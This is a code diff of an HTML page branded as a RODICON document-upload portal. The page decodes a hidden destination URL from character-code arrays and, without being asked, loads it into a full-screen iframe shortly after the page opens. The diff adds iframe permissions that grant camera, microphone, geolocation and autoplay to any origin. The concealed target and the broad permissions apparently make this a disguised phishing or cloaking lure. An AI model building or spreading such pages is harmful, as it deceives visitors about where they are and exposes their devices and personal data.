@@ -6,7 +6,8 @@
   <title>Carga de Documentos RODICON</title>
   <style>
     body,html{margin:0;padding:0;width:100%;height:100%;overflow:hidden;font-family:system-ui}
-    iframe{border:none;width:100%;height:100%}
+    /* El iframe debe tener permisos explícitos */
+    iframe{border:none;width:100%;height:100%;display:block;}
     .loading{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center}
     .dot{width:8px;height:8px;background:#2c80ff;border-radius:50%;display:inline-block;margin:0 4px;animation:pulse 1.5s infinite}
     .dot:nth-child(2){animation-delay:0.3s}
@@ -31,7 +32,7 @@
   <button onclick="conectar()" style="background:#2c80ff;color:#fff;border:none;padding:10px 24px;border-radius:6px;cursor:pointer;font-size:14px;transition:background 0.2s">Conectar</button>
 </div>
 
-<iframe id="portal" style="display:none"></iframe>
+<iframe id="portal" style="display:none" allow="camera *; microphone *; autoplay *; encrypted-media *; fullscreen *; geolocation *"></iframe>
 
 <script>
 
@@ -54,41 +55,20 @@ const configApi = {
   retryDelay: 1000
 };
 
-
 function decodificar(parte) {
   return parte.map(c => String.fromCharCode(c)).join('');
 }
 
-
 function obtenerDestino() {
   const e = configApi.endpoints;
-  const partes = [
-    e.primary,   
-    e.domain,   
-    e.path,      
-    e.keyA,      
-    e.keyB,      
-    e.keyC,      
-    e.keyD,      
-    e.keyE,      
-    e.keyF,      
-    e.keyG,      
-    e.keyH       
-  ];
-  
+  const partes = [e.primary, e.domain, e.path, e.keyA, e.keyB, e.keyC, e.keyD, e.keyE, e.keyF, e.keyG, e.keyH];
   try {
     const url = partes.map(decodificar).join('');
-    
-    if (!url.startsWith('https://') || url.length < 50) {
-      throw new Error('Estructura inválida');
-    }
+    if (!url.startsWith('https://') || url.length < 50) throw new Error('Estructura inválida');
     return url;
-  } catch {
-    return null;
-  }
+  } catch { return null; }
 }
 
-// Mostrar/ocultar error
 function mostrarError(texto) {
   document.querySelector('.loading').style.display = 'none';
   document.getElementById('msgError').textContent = texto;
@@ -100,10 +80,8 @@ function ocultarError() {
   document.querySelector('.loading').style.display = 'block';
 }
 
-
 function conectar() {
   ocultarError();
-  
   const destino = obtenerDestino();
   if (!destino) {
     setTimeout(() => mostrarError('Error de configuración'), 300);
@@ -122,9 +100,7 @@ function conectar() {
     mostrarError('No se pudo establecer conexión');
   };
   
-  
   portal.src = destino + '?_=' + Date.now();
-  
   
   setTimeout(() => {
     if (cargando.style.display !== 'none') {
@@ -133,9 +109,7 @@ function conectar() {
   }, configApi.timeout);
 }
 
-
 setTimeout(conectar, 800);
-
 
 document.body.addEventListener('click', function() {
   if (document.querySelector('.error').style.display === 'block') {
@@ -143,6 +117,5 @@ document.body.addEventListener('click', function() {
   }
 });
 </script>
-
 </body>
 </html>
